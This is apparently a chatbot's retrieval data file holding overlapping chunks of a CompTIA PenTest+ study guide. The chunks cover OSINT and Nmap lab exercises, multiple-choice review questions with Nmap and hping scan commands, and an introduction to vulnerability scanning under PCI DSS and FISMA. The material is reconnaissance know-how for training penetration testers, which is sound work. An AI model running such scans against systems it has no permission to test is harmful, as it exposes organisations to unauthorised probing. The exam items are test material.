will continue throughout the test. Successful pentesters must be able to build a comprehensive information‐gathering plan that recognizes where each technique and tool can be used appropriately. They must also be familiar with common tools like Nmap, and know how and when to use them and how to interpret their outputs. Exam Essentials Understand passive reconnaissance. Passive information gathering is performed entirely without interacting with the organization or its systems and relies on third‐party information sources. These include using DNS lookups
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	services to determine their capabilities. Information gathering provides the foundation for each successive phase of a penetration test and will continue throughout the test. Successful pentesters must be able to build a comprehensive information‐gathering plan that recognizes where each technique and tool can be used appropriately. They must also be familiar with common tools like Nmap, and know how and when to use them and how to interpret their outputs. Exam Essentials Understand passive reconnaissance. Passive information gathering is performed entirely without interacting with the organization or its systems and relies on third‐party information sources. These include using DNS lookups and social media scraping, searching for information like password and data dumps and breach information, reviewing corporate information, and using passive reconnaissance search engines like Shodan and Censys as part of their normal efforts. Information about an organization's domains, IP ranges, software, employees, finances, and technologies, and many other useful elements of information can be gathered as part of an OSINT effort. Know the purpose of reconnaissance exercises. Enumeration of users, email addresses, URLs, shares, and services, as well as groups, relationships, applications, and many other types of data, provides further information for pentesters. Enumeration provides a list of potential targets for testing, social engineering, or other techniques. Pentesters should know the basic concepts and techniques commonly used for enumeration as well as the tools that are most frequently used for each type of enumeration. Be familiar with the steps involved in active reconnaissance. Once open source information about an organization has been gathered and networks and hosts that will be targeted have been identified, active reconnaissance begins. Active reconnaissance involves direct interactions with target systems and services and is intended to gather information that will allow pentesters to target attacks effectively. Port scans, version scans, and other interactive assessment techniques are used to gather information in this phase of a penetration test. Testers should be very familiar with tools like Nmap, including any specific flags and scan capabilities. Active reconnaissance may include the need to identify defenses, determine if third‐party or cloud‐hosted systems may be included in infrastructure or target lists, and learn how to avoid detection. Be able to describe the purpose of information gathering and code review. Applications, code, tokens, and application interfaces are all legitimate targets in penetration tests, and understanding how to gather information about applications through code analysis, debugging, and decompilation can be important when you encounter them. Although knowing how to decompile an application and read every line of code isn't in scope, understanding the basics of how to read source code, how to find useful information in compiled code, and what techniques exist for pentesters to work with both compiled and interpreted code is important. Pentesters must also know how tokens are used and the basic concepts behind how tokens could be exploited as part of a penetration test. Lab Exercises Activity 3.1: Gathering OSINT Manually In this activity, you will use manual tools to gather OSINT. You may use Windows or
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	when you encounter them. Although knowing how to decompile an application and read every line of code isn't in scope, understanding the basics of how to read source code, how to find useful information in compiled code, and what techniques exist for pentesters to work with both compiled and interpreted code is important. Pentesters must also know how tokens are used and the basic concepts behind how tokens could be exploited as part of a penetration test. Lab Exercises Activity 3.1: Gathering OSINT Manually In this activity, you will use manual tools to gather OSINT. You may use Windows or Linux tools; however, we recommend using a Kali Linux virtual or physical machine for exercises like this to increase your familiarity with Linux and the Kali toolsets. 1. Identify a domain belonging to a company or organization that you are familiar with. 2. Use the dig command to review information about the domain and record your results. 3. Use the appropriate WHOIS engine to look up the domain and identify contacts and other interesting information. 4. Perform a traceroute for the domain. Record your findings and any interesting data about the route. Can you identify the company's hosting provider, Internet service provider, or geographic location based on the traceroute information? 5. Kali users only: Use theHarvester to gather search engine information, including emails for the domain. What information is publicly exposed? Activity 3.2: Exploring Shodan In this lab, you will use the Shodan and Censys search engines to gather information about an organization. Pick an organization that you are familiar with for this exercise. 1. Visit shodan.io and search for the main domain for the organization you have selected. 2. Review the results and identify how many unique results you have. 3. Record the URL or IP address for one or more interesting hosts. If you don't find anything interesting, select another domain to test. 4. Using the URLs or IP addresses that you identified, visit censys.io and search for them. 5. Identify what differences you see between the two search engines. How would this influence your use of each? How could the information be useful as part of an OSINT‐gathering exercise? 6. Return to Shodan and click Explore. Select one of the top voted or featured categories, and explore systems listed there. What types of issues can you identify from these listings? Activity 3.3: Running an Nmap Scan In this lab you will use the scanme.nmapcom target to practice your Nmap scanning techniques. 1. Your penetration test scope requires you to perform operating system identification and to scan for all common ports, but not to scan the full range of possible ports. Identify the command you would run to conduct a scan with these requirements from a system that you control and have root access to. 2. How would you change the command in the following situations: a. You did not have administrative or root access on the system you were running Nmap from. b. You needed to scan
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	this lab you will use the scanme.nmapcom target to practice your Nmap scanning techniques. 1. Your penetration test scope requires you to perform operating system identification and to scan for all common ports, but not to scan the full range of possible ports. Identify the command you would run to conduct a scan with these requirements from a system that you control and have root access to. 2. How would you change the command in the following situations: a. You did not have administrative or root access on the system you were running Nmap from. b. You needed to scan all ports from 1–65535. c. You needed to perform service identification. d. You were scanning only UDP ports. 3. Run each of these scans against scanme.nmap.org and compare your results. What differences did you see? Review Questions You can find the answers in the Appendix A. 1. Megan runs the following Nmap scan: nmap -sU -sT -p 1-65535 example.com What information will she not receive? A. TCP services B. The state of the service C. UDP services D. A list of vulnerable services 2. Tom wants to find metadata about an organization using a search engine. What tool from the following list should he use? A. ExifTool B. MetaSearch C. FOCA D. Nmap 3. After running an Nmap scan of a system, Zarmeena discovers that TCP ports 139, 443, and 3389 are open. What operating system is she most likely to discover running on the system? A. Windows B. Android C. Linux D. iOS 4. Charles runs an Nmap scan using the following command: nmap -sT -sV -T2 -p 1-65535 example.com After watching the scan run for over two hours, he realizes that he needs to optimize the scan. Which of the following is not a useful way to speed up his scan? A. Only scan via UDP to improve speed. B. Change the scan timing to 3 or faster. C. Change to a SYN scan. D. Use the default port list. 5. Karen identifies TCP ports 8080 and 8443 open on a remote system during a port scan. What tool is her best option to manually validate the services running on these ports? A. SSH B. SFTP C. Telnet D. A web browser 6. Angela recovered a PNG image during the early intelligence‐gathering phase of a penetration test and wants to examine it for useful metadata. What tool could she most successfully use to do this? A. ExifTool B. Grep C. PsTools D. Nginx 7. During an Nmap scan, Casey uses the ‐O flag. The scan identifies the host as follows: Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.9 - 2.6.33 What can she determine from this information? A. The Linux distribution installed on the target B. The patch level of the installed Linux kernel C. The date the remote system was last patched D. That the system is running a Linux 2.6 kernel between .9 and .33 8. What is the full range of ports that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	she most successfully use to do this? A. ExifTool B. Grep C. PsTools D. Nginx 7. During an Nmap scan, Casey uses the ‐O flag. The scan identifies the host as follows: Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.9 - 2.6.33 What can she determine from this information? A. The Linux distribution installed on the target B. The patch level of the installed Linux kernel C. The date the remote system was last patched D. That the system is running a Linux 2.6 kernel between .9 and .33 8. What is the full range of ports that a UDP service can run on? A. 1–1024 B. 1–16,383 C. 1–32,767 D. 1–65,535 9. Steve is working from an unprivileged user account that was obtained as part of a penetration test. He has discovered that the host he is on has Nmap installed, and he wants to scan other hosts in his subnet to identify potential targets as part of a pivot attempt. What Nmap flag will Steve probably have to use to successfully scan hosts from this account? A. ‐sV B. ‐u C. ‐oA D. ‐sT 10. Which of the following provides information about a domain's registrar and physical location? A. Nslookup B. host C. WHOIS D. traceroute 11. Chris runs an Nmap scan of the 10.10.0.0/16 network that his employer uses as an internal network range for the entire organization. If he uses the ‐T0 flag, what issue is he likely to encounter? A. The scan will terminate when the host count reaches 0. B. The scan will not scan IP addresses in the .0 network. C. The scan will progress at a very slow speed. D. The scan will only scan for TCP services. 12. Which of the following Nmap output formats is unlikely to be useful for a pentester? A. ‐oA B. ‐oS C. ‐oG D. ‐oX 13. During an early phase of his penetration test, Mike recovers a binary executable file that he wants to quickly analyze for useful information. Which of the following will quickly give him a view of potentially useful information in the binary? A. Netcat B. strings C. Hashmod D. Eclipse 14. Jack is conducting a penetration test for a customer in Japan. What NIC will he most likely have to check for information about his client's networks? A. RIPE B. ARIN C. APNIC D. LACNIC 15. Lin believes that the organization she is scanning may have load balancers in use. Which of the following techniques will help her detect them if they are DNS‐based load balancers? A. Use Nmap and look for service port differences. B. Use ping and check for TTL and IP changes. C. Use Nessus and check for service version differences. D. Use WHOIS to check for multiple hostnames. 16. Charles uses the following hping command to send traffic to a remote system: hping remotesite.com -S -V -p 80 What type of traffic will the remote system see? A. HTTP traffic to TCP port 80 B.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the organization she is scanning may have load balancers in use. Which of the following techniques will help her detect them if they are DNS‐based load balancers? A. Use Nmap and look for service port differences. B. Use ping and check for TTL and IP changes. C. Use Nessus and check for service version differences. D. Use WHOIS to check for multiple hostnames. 16. Charles uses the following hping command to send traffic to a remote system: hping remotesite.com -S -V -p 80 What type of traffic will the remote system see? A. HTTP traffic to TCP port 80 B. TCP SYNs to TCP port 80 C. HTTPS traffic to TCP port 80 D. A TCP three‐way handshake to TCP port 80 17. What does a result of * * * mean during a traceroute? A. No route to the host exists. B. All hosts are queried. C. There is no response to the query, perhaps a timeout, but traffic is going through. D. A firewall is blocking responses. 18. Rick wants to describe flaws found in an organization's internally developed web applications using a standard model. Which of the following is best suited to his need? A. CWE B. The Diamond Model C. CVE D. OWASP 19. Why would a pentester look for expired certificates as part of an information‐gathering and enumeration exercise? A. They indicate improper encryption, allowing easy decryption of traffic. B. They indicate services that may not be properly updated or managed. C. Attackers install expired certificates to allow easy access to systems. D. Pentesters will not look for expired certificates; they only indicate procedural issues. 20. John has gained access to a system that he wants to use to gather more information about other hosts in its local subnet. He wants to perform a port scan but cannot install other tools to do so. Which of the following tools isn't usable as a port scanner? A. Hping B. Netcat C. Telnet D. ExifTool Chapter 4 Vulnerability Scanning THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 3: Vulnerability Discovery and Analysis 3.1 Given a scenario, conduct vulnerability discovery using various techniques. Types of scans Network scans TCP/UDP scan Stealth scans Host‐based scans Authenticated vs. unauthenticated scans Tools Nikto Greenbone/Open Vulnerability Assessment Scanner (OpenVAS) Tenable Nessus Trivy Cybersecurity teams have a wide variety of tools at their disposal to identify vulnerabilities in operating systems, platforms, and applications. Automated vulnerability scanners are capable of rapidly scanning systems and entire networks in an effort to seek out and detect previously unidentified vulnerabilities using a series of tests. Vulnerability management programs seek to identify, prioritize, and remediate these vulnerabilities before an attacker exploits them to undermine the confidentiality, integrity, or availability of enterprise information assets. Effective vulnerability management programs use an organized approach to scanning enterprise assets for vulnerabilities, using a defined workflow to remediate those vulnerabilities and performing continuous assessment to provide technologists and managers with insight into the current state of enterprise cybersecurity. Penetration testers
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	platforms, and applications. Automated vulnerability scanners are capable of rapidly scanning systems and entire networks in an effort to seek out and detect previously unidentified vulnerabilities using a series of tests. Vulnerability management programs seek to identify, prioritize, and remediate these vulnerabilities before an attacker exploits them to undermine the confidentiality, integrity, or availability of enterprise information assets. Effective vulnerability management programs use an organized approach to scanning enterprise assets for vulnerabilities, using a defined workflow to remediate those vulnerabilities and performing continuous assessment to provide technologists and managers with insight into the current state of enterprise cybersecurity. Penetration testers (and hackers!) leverage these same tools to develop a sense of an organization's security posture and identify potential targets for more in‐depth probing and exploitation. Real World Scenario Developing a Vulnerability Scanning Plan Let's revisit the penetration test of MCDS, LLC that you began in Chapter 3, “Information Gathering.” When we left off, you conducted an Nmap scan to determine the active hosts and services on the network ranges used by MCDS. As you read through this chapter, develop a plan for using vulnerability scanning to continue the information gathering that you already began. Answer the following questions: How would you scope a vulnerability scan for the MCDS networks? What limitations would you impose on the scan? Would you limit the scan to services that you suspect are running on MCDS hosts from your Nmap results, or would you conduct full scans? Will you attempt to run your scans in a stealthy manner to avoid detection by the MCDS cybersecurity team? Will you supplement your network vulnerability scans with web application scans and/or database scans? Can the scan achieve multiple goals simultaneously? For example, might the scan results be used to detect configuration compliance with organizational standards? Or might they feed into an automated remediation workflow? You'll be asked to design a vulnerability testing plan answering these questions in a lab exercise at the end of this chapter. Identifying Vulnerability Management Requirements By their nature, the vulnerability scanning tools used by enterprise cybersecurity teams for continuous monitoring and those used by penetration testers have significant overlap. In many cases, penetration testers leverage the same instances of those tools to achieve both time savings and cost reduction. If an enterprise has a robust vulnerability management program, that program can serve as a valuable information source for penetration testers. Therefore, we'll begin this chapter by exploring the process of creating a vulnerability management program for an enterprise and then expand into the specific uses of these tools for penetration testing. As an organization begins developing a vulnerability management program, it should first undertake the identification of any internal or external requirements for vulnerability scanning. These requirements may come from the regulatory environment(s) in which the organization operates, or they may come from internal policy‐driven requirements. Regulatory Environment Many organizations find themselves bound by laws and regulations that govern the ways they store, process, and transmit information. This is especially true when the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	this chapter by exploring the process of creating a vulnerability management program for an enterprise and then expand into the specific uses of these tools for penetration testing. As an organization begins developing a vulnerability management program, it should first undertake the identification of any internal or external requirements for vulnerability scanning. These requirements may come from the regulatory environment(s) in which the organization operates, or they may come from internal policy‐driven requirements. Regulatory Environment Many organizations find themselves bound by laws and regulations that govern the ways they store, process, and transmit information. This is especially true when the organization handles sensitive personal information or information belonging to government agencies. Many of these laws are not overly prescriptive and do not specifically address the implementation of a vulnerability management program. For example, the Health Insurance Portability and Accountability Act (HIPAA) regulates the ways that healthcare providers, insurance companies, and their business associates handle protected health information. Similarly, the Family Educational Rights and Privacy Act (FERPA) governs how educational institutions may handle student educational records. Neither of these laws specifically requires that covered organizations conduct vulnerability scanning. Two regulatory schemes, however, do specifically mandate the implementation of a vulnerability management program: the Payment Card Industry Data Security Standard (PCI DSS) and the Federal Information Security Management Act of 2002 (FISMA). Payment Card Industry Data Security Standard PCI DSS prescribes specific security controls for merchants who handle payment card transactions and service providers who assist merchants with these transactions. This standard includes what are arguably the most specific requirements for vulnerability scanning of any standard. Contrary to what some believe, PCI DSS is not a law. The standard is maintained by an industry group known as the Payment Card Industry Security Standards Council (PCI SSC), which is funded by the industry to maintain the requirements. Organizations are subject to PCI DSS because of contractual requirements rather than legal requirements. PCI DSS 4.0 prescribes many of the details of vulnerability scans: Organizations must run both internal and external scans on at least a quarterly basis (PCI DSS requirements 11.3.1 and 11.3.2). Organizations must run internal and external scans after a significant change (PCI DSS requirements 11.3.1.3 and 11.3.2.1). Internal scans must be conducted by qualified personnel (PCI DSS requirement 11.3.1). Organizations must remediate any high‐risk and critical vulnerabilities and repeat scans to confirm that they are resolved until they receive a “clean” scan report (PCI DSS requirements 11.3.1 and 11.3.2). External scans must be conducted by an approved scanning vendor (ASV) authorized by PCI SSC (PCI DSS requirement 11.3.2). Vulnerability scanning for PCI DSS compliance is a thriving and competitive industry, and many security consulting firms specialize in these scans. Many organizations choose to conduct their own scans first to assure themselves that they will achieve a passing result before requesting an official scan from an ASV. You should never conduct vulnerability scans unless you have explicit permission to do so. Running scans without permission can be a serious violation of an
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	scan report (PCI DSS requirements 11.3.1 and 11.3.2). External scans must be conducted by an approved scanning vendor (ASV) authorized by PCI SSC (PCI DSS requirement 11.3.2). Vulnerability scanning for PCI DSS compliance is a thriving and competitive industry, and many security consulting firms specialize in these scans. Many organizations choose to conduct their own scans first to assure themselves that they will achieve a passing result before requesting an official scan from an ASV. You should never conduct vulnerability scans unless you have explicit permission to do so. Running scans without permission can be a serious violation of an organization's security policy and may also be a crime. Federal Information Security Management Act The Federal Information Security Management Act of 2002 (FISMA) requires that government agencies and other organizations’ operating systems on behalf of government agencies comply with a series of security standards. The specific controls required by these standards depend on whether the government designates the system as low impact, moderate impact, or high impact, according to the definitions shown in Figure 4.1. Further guidance on system classification is found in Federal Information Processing Standard (FIPS) 199: Standards for Security Categorization of Federal Information and Information Systems. FIGURE 4.1 FIPS 199 Standards Source: https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.199.pdf In 2014, President Obama signed the Federal Information Security Modernization Act (yes, also confusingly abbreviated FISMA!) into law. The 2014 FISMA updated the 2002 FISMA requirements to provide strong cyberdefense in a changing threat environment. Most people use the term FISMA to refer to the combined effect of both of these laws. All federal information systems, regardless of their impact categorization, must meet the basic requirements for vulnerability scanning found in NIST Special Publication 800‐53, Security and Privacy Controls for Information Systems and Organizations. Each organization subject to FISMA must meet the following requirements, described in section RA‐5 “Vulnerability Monitoring and Scanning” (https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.80053r5.pdf): a. Monitor and scan for vulnerabilities in the system and hosted applications, and when new vulnerabilities potentially affecting the system are identified and reported; b. Employ vulnerability monitoring tools and techniques that facilitate interoperability among tools and automate parts of the vulnerability management process by using standards for: 1. Enumerating platforms, software flaws, and improper configurations; 2. Formatting checklists and test procedures; and 3. Measuring vulnerability impact; c. Analyze vulnerability scan reports and results from vulnerability monitoring; d. Remediate legitimate vulnerabilities in accordance with an organizational assessment of risk; e. Share information obtained from the vulnerability monitoring process and control assessments to help eliminate similar vulnerabilities in other information systems; and f. Employ vulnerability monitoring tools that include the capability to readily update the vulnerabilities to be scanned. These requirements establish a baseline for all federal information systems. NIST 800‐53 then describes eight control enhancements that may be required depending on the circumstances: 1. (Withdrawn by NIST) 2. Update the system vulnerabilities to be scanned prior to a new scan (and/or) when new vulnerabilities are identified and reported. 3. Define the breadth and depth of vulnerability scanning coverage. 4. Determine information
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	information obtained from the vulnerability monitoring process and control assessments to help eliminate similar vulnerabilities in other information systems; and f. Employ vulnerability monitoring tools that include the capability to readily update the vulnerabilities to be scanned. These requirements establish a baseline for all federal information systems. NIST 800‐53 then describes eight control enhancements that may be required depending on the circumstances: 1. (Withdrawn by NIST) 2. Update the system vulnerabilities to be scanned prior to a new scan (and/or) when new vulnerabilities are identified and reported. 3. Define the breadth and depth of vulnerability scanning coverage. 4. Determine information about the system that is discoverable and subsequently take organization‐defined corrective actions. 5. Implement privileged access authorization to organization‐defined system components for selected vulnerability scanning activities. 6. Compare the results of multiple vulnerability scans using automated mechanisms. 7. (Withdrawn by NIST) 8. Review historic audit logs to determine if a vulnerability identified in the system has been previously exploited within a defined time period. 9. (Withdrawn by NIST) 10. Correlate the output from vulnerability scanning tools to determine the presence of multi‐vulnerability and multi‐hop attack vectors. 11. Establish a public reporting channel for receiving reports of vulnerabilities in organizational systems and system components. Note that requirements 1, 7, and 9 were control enhancements that were previously included in the standard but were later withdrawn. In cases where a federal agency determines that an information system falls into the low impact category, it must implement control enhancements 2 and 11, at a minimum. Moderate impact systems must implement control enhancements 2, 5, and 11. If the agency determines a system has high impact, it must implement at least control enhancements 2, 4, 5, and 11. Corporate Policy The prescriptive security requirements of PCI DSS and FISMA cover organizations involved in processing payment card transactions and operating U.S. government systems, but those two categories constitute only a fraction of all enterprises. Cybersecurity professionals widely agree that vulnerability management is a critical component of any information security program, and for this reason, many organizations mandate vulnerability scanning in corporate policy, even if that is not a regulatory requirement. Support for Penetration Testing Although penetration testers often draw on the vulnerability scans that organizations conduct for other purposes, they may also have specialized scanning requirements in support of specific penetration testing efforts. If a penetration testing team plans to conduct a test of a specific network or environment, they may conduct an in‐depth scan of that environment as one of the first steps in their information‐gathering phase. Similarly, if the team plans to target a specific service, they may design and execute scans that focus on that service. For example, an organization might decide to conduct a penetration test focused on a newly deployed Internet of Things (IoT) environment. In that case, the penetration testers may conduct vulnerability scans that focus on networks containing those devices and using tests that are focused on known IoT vulnerabilities. Identifying Scan Targets Once an organization decides to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	specific network or environment, they may conduct an in‐depth scan of that environment as one of the first steps in their information‐gathering phase. Similarly, if the team plans to target a specific service, they may design and execute scans that focus on that service. For example, an organization might decide to conduct a penetration test focused on a newly deployed Internet of Things (IoT) environment. In that case, the penetration testers may conduct vulnerability scans that focus on networks containing those devices and using tests that are focused on known IoT vulnerabilities. Identifying Scan Targets Once an organization decides to conduct vulnerability scanning and determines which, if any, regulatory requirements apply to its scans, it moves on to the more detailed phases of the planning process. The next step is to identify the systems that will be covered by the vulnerability scans. Some organizations choose to cover all systems in their scanning process, whereas others scan systems differently (or not at all) depending on the answers to questions such as these: What is the data classification of the information stored, processed, or transmitted by the system? Is the system exposed to the Internet or other public or semipublic networks? What services are offered by the system? Is the system a production, test, or development system? Organizations also use automated techniques to identify the systems that may be covered by a scan. Cybersecurity professionals use scanning tools to search the network for connected systems, whether they were previously known or unknown, and build an asset inventory. Figure 4.2 shows an example of an asset map developed using the Qualys vulnerability scanner's asset inventory functionality. FIGURE 4.2 Qualys asset map Administrators may supplement this inventory with additional information about the type of system and the information it handles. This information then helps make determinations about which systems are critical and which are noncritical. Asset inventory and criticality information helps guide decisions about the types of scans that are performed, the frequency of those scans, and the priority administrators should place on remediating vulnerabilities detected by the scans. Determining Scan Frequency Cybersecurity professionals depend on automation to help them perform their duties in an efficient, effective manner. Vulnerability scanning tools allow the automated scheduling of scans to take the burden off administrators. Figure 4.3 shows an example of how these scans might be configured in Tenable's Nessus product. Administrators may designate a schedule that meets their security, compliance, and business requirements. FIGURE 4.3 Configuring a Nessus scan Administrators should configure these scans to provide automated alerting when they detect new vulnerabilities. Many security teams configure their scans to produce automated email reports of scan results, such as the report shown in Figure 4.4. Penetration testers normally require interactive access to the scanning console so that they can retrieve reports from previously performed scans of different systems as their attention shifts. This access also allows penetration testers to form ad hoc scans as the focus of the penetration test evolves to include systems, services,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	that meets their security, compliance, and business requirements. FIGURE 4.3 Configuring a Nessus scan Administrators should configure these scans to provide automated alerting when they detect new vulnerabilities. Many security teams configure their scans to produce automated email reports of scan results, such as the report shown in Figure 4.4. Penetration testers normally require interactive access to the scanning console so that they can retrieve reports from previously performed scans of different systems as their attention shifts. This access also allows penetration testers to form ad hoc scans as the focus of the penetration test evolves to include systems, services, and vulnerabilities that might not have been covered by previous scans. Many factors influence how often an organization decides to conduct vulnerability scans against its systems: The organization's risk appetite is its willingness to tolerate risk within the environment. If an organization is extremely risk averse, it may choose to conduct scans more frequently to minimize the amount of time between when a vulnerability comes into existence and when it is detected by a scan. Regulatory requirements, such as PCI DSS or FISMA, may dictate a minimum frequency for vulnerability scans. These requirements may also come from corporate policies. Technical constraints may limit the frequency of scanning. For example, the scanning system may only be capable of performing a certain number of scans per day and organizations may need to adjust scan frequency to ensure that all scans complete successfully. Business constraints may prevent the organization from conducting resource‐intensive vulnerability scans during periods of high business activity to avoid disruption of critical processes. Licensing limitations may curtail the bandwidth consumed by the scanner or the number of scans that may be conducted simultaneously. Operational constraints may limit the ability of the cybersecurity team to monitor and react to scan results promptly. Cybersecurity professionals must balance all of these considerations when planning a vulnerability scanning program. It is usually wise to begin small and slowly expand the scope and frequency of vulnerability scans over time to avoid overwhelming the scanning infrastructure or enterprise systems. FIGURE 4.4 Sample Nessus scan report Penetration testers must understand the trade‐off decisions that were made when the organization designed its existing vulnerability management program. These limitations may point to areas where penetration testers should supplement the organization's existing scans with customized scans designed specifically for the purposes of penetration testing. Active vs. Passive Scanning Most vulnerability scanning tools perform active vulnerability scanning, meaning that the tool actually interacts with the scanned host to identify open services and check for possible vulnerabilities. Active scanning does provide high‐quality results, but those results come with some drawbacks: Active scanning is noisy and will likely be detected by the administrators of scanned systems. This may not be an issue in environments where administrators have knowledge of the scanning, but active scanning is problematic if the scan is meant to be stealthy. Active scanning also has the potential to accidentally exploit vulnerabilities and interfere with the functioning of production systems. Although
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	scanning tools perform active vulnerability scanning, meaning that the tool actually interacts with the scanned host to identify open services and check for possible vulnerabilities. Active scanning does provide high‐quality results, but those results come with some drawbacks: Active scanning is noisy and will likely be detected by the administrators of scanned systems. This may not be an issue in environments where administrators have knowledge of the scanning, but active scanning is problematic if the scan is meant to be stealthy. Active scanning also has the potential to accidentally exploit vulnerabilities and interfere with the functioning of production systems. Although active scanners often have settings that you can use to minimize this risk, the reality is that active scanning can cause production issues. Active scans may also completely miss some systems if they are blocked by firewalls, intrusion prevention systems, network segmentation, or other security controls. Passive vulnerability scanning takes a different approach that supplements active scans. Instead of probing systems for vulnerabilities, passive scanners monitor the network, similar to the technique used by intrusion detection systems. But instead of watching for intrusion attempts, they look for the telltale signatures of outdated systems and applications, reporting results to administrators. Passive scans have some very attractive benefits, but they're only capable of detecting vulnerabilities that are reflected in network traffic. They're not a replacement for active scanning, but they are a very strong complement to periodic active vulnerability scans. Configuring and Executing Vulnerability Scans Whether scans are being performed by cybersecurity analysts focused on building a lasting vulnerability management program or penetration testers conducting a one‐off scan as part of a test, administrators must configure vulnerability management tools to perform scans according to the requirements‐based scan specifications. These tasks include identifying the appropriate scope for each scan, configuring scans to meet the organization's requirements, and maintaining the currency of the vulnerability scanning tool. Scoping Vulnerability Scans The scope of a vulnerability scan describes the extent of the scan, including answers to the following questions: What systems, networks, services, applications, and protocols will be included in the vulnerability scan? What technical measures will be used to test whether systems are present on the network? What tests will be performed against systems discovered by a vulnerability scan? When designing vulnerability scans as part of an ongoing program, administrators should first answer these questions in a general sense and ensure that they have consensus from technical staff and management that the scans are appropriate and unlikely to cause disruption to the business. Once they've determined that the scans are well designed and unlikely to cause serious issues, they may then move on to configuring the scans within the vulnerability management tool. When scans are taking place as part of a penetration test, penetration testers should still avoid business disruption to the extent possible. However, the invasiveness of the testing and the degree of coordination with management should be guided by the agreed‐upon statement of work (SOW) for the penetration test. If the penetration testers
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	from technical staff and management that the scans are appropriate and unlikely to cause disruption to the business. Once they've determined that the scans are well designed and unlikely to cause serious issues, they may then move on to configuring the scans within the vulnerability management tool. When scans are taking place as part of a penetration test, penetration testers should still avoid business disruption to the extent possible. However, the invasiveness of the testing and the degree of coordination with management should be guided by the agreed‐upon statement of work (SOW) for the penetration test. If the penetration testers have carte blanche to use whatever techniques are available to them without prior coordination, it is not necessary to consult with management. Testers must, however, always stay within the agreed‐upon scope of their SOWs. By this point, the fact that penetration testers must take pains to stay within the defined parameters of their SOWs should not be news to you. Keep this fact top‐of‐mind as you take the PenTest+ exam. If you see questions asking you whether a decision is appropriate, your first reaction should be to consult the SOW. Scoping Compliance Scans Scoping is an important tool in the cybersecurity toolkit because it allows analysts to reduce problems to manageable size. For example, an organization that processes credit cards may face the seemingly insurmountable task of achieving PCI DSS compliance across its entire network that consists of thousands of systems. Through judicious use of network segmentation and other techniques, administrators may isolate the handful of systems actually involved in credit card processing, segregating them from the vast majority of systems on the organization's network. When done properly, this segmentation reduces the scope of PCI DSS compliance to the much smaller isolated network that is dedicated to payment card processing. When the organization is able to reduce the scope of the PCI DSS network, it also reduces the scope of many of the required PCI DSS controls, including vulnerability scanning. Instead of contracting with an approved scanning vendor to conduct quarterly compliance scans of the organization's entire network, they may reduce the scope of that scan to those systems that actually engage in card processing. This will dramatically reduce the cost of the scanning engagement and the remediation workload facing cybersecurity professionals after the scan completes. Configuring Vulnerability Scans Vulnerability management solutions provide the ability to configure many different parameters related to scans. In addition to scheduling automated scans and producing reports, administrators may customize the types of checks performed by the scanner, provide credentials to access target servers, install scanning agents on target servers, and conduct scans from a variety of network perspectives. Vulnerability Scanners Penetration testers have a variety of vulnerability scanners at their disposal. There are three major scanners that you should be familiar with as you prepare for the exam: Nessus was one of the original vulnerability scanning tools and it remains extremely popular today. It is a commercial product available from Tenable. Greenbone OpenVAS is
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	related to scans. In addition to scheduling automated scans and producing reports, administrators may customize the types of checks performed by the scanner, provide credentials to access target servers, install scanning agents on target servers, and conduct scans from a variety of network perspectives. Vulnerability Scanners Penetration testers have a variety of vulnerability scanners at their disposal. There are three major scanners that you should be familiar with as you prepare for the exam: Nessus was one of the original vulnerability scanning tools and it remains extremely popular today. It is a commercial product available from Tenable. Greenbone OpenVAS is an open source alternative that offers a free, but powerful, vulnerability detection suite. Trivy is a specialized vulnerability scanning tool focused on containerized systems. It is also an open source project. Many other products are available on the commercial market as well. The examples in this chapter use two popular vulnerability scanning tools: Nessus and Qualys. These are both commercial products that are widely used in the penetration testing community. Scan Sensitivity Levels Cybersecurity professionals configuring vulnerability scans should pay careful attention to the configuration settings related to the scan sensitivity level. Although it may be appropriate in some cases to conduct full scans using all available vulnerability tests, it is usually more productive to adjust the scan settings to the specific needs of the assessment or penetration test that is underway. Scan sensitivity settings determine the types of checks that the scanner will perform and should be customized to ensure that the scan meets its objectives while minimizing the possibility of disrupting the target environment. Typically, administrators create a new scan by beginning with a template. This may be a template provided by the vulnerability management vendor and built into the product, such as the Nessus templates shown in Figure 4.5, or it may be a custom‐developed template created for use within the organization. As administrators create their own scan configurations, they should consider saving common configuration settings in templates to allow efficient reuse of their work, saving time and reducing errors when configuring future scans. FIGURE 4.5 Nessus scan templates Configuring Plug‐Ins Administrators may also improve the efficiency of their scans by configuring the specific plug‐ins that will run during each scan. Each plug‐ in performs a check for a specific vulnerability, and these plug‐ins are often grouped into families based on the operating system, application, or device that they involve. Disabling unnecessary plug‐ins improves the speed of the scan by bypassing unnecessary checks and also may reduce the number of false positive results detected by the scanner. For example, an organization that does not use the Amazon Linux operating system may choose to disable all checks related to Amazon Linux in its scanning template. Figure 4.6 shows an example of disabling these plug‐ins in Nessus. Similarly, an organization that blocks the use of some protocols at the network firewall may not wish to consume time performing external scans using those protocols. FIGURE 4.6 Disabling unused plug‐ins Scanning
